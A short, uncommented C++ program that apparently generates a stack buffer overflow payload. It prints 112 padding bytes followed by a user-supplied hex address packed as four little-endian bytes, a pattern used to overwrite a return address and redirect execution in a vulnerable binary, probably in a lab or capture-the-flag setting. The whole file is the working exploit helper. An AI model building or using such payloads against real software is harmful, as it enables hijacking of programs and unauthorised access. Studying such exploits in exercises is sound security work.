#include <iostream>
#include <string>
#include <sstream>
using namespace std;
int main(int argc,char** argv){

	string overf ="";
	if(argc != 2){
		cout<<"Wrong number of argument count"<<endl;
		return 0;
	}
	for(int i=0;i<112;i++){
		overf+="a";
	}
	unsigned int address;

	stringstream ss;
	ss << hex << argv[1];
	ss >> address;

	unsigned char p1 = (address & 0xFF);
	unsigned char p2 = (address>>8 & 0xFF);
	unsigned char p3 = (address>>16 & 0xFF);
	unsigned char p4 = (address>>24 & 0xFF);

	cout << overf<<p1 << p2 << p3 << p4;
}
